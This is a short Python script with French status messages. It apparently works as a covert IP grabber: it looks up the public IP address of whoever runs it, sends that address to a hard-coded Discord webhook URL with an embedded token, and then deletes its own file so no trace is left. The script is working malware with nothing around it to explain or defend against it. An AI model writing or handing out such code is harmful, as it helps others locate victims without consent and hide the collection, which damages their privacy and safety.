import os
import sys
import requests

ip = requests.get('https://api.ipify.org').text

webhook_url = "https://discord.com/api/webhooks/1446737966616547429/tnrCpgYUsP5RjkWocLk_EnQmwjEfEA6vXCPRCtwe80N595UkJRSqF5SZxvNk6ML3tsP6"
data = {
    "content": ip
}
response = requests.post(webhook_url, json=data)
if response.status_code == 204:
    print("Message envoyé avec succès !")
else:
    print(f"Échec de l'envoi : {response.status_code}, {response.text}")

script_path = os.path.abspath(sys.argv[0])
os.remove(script_path)
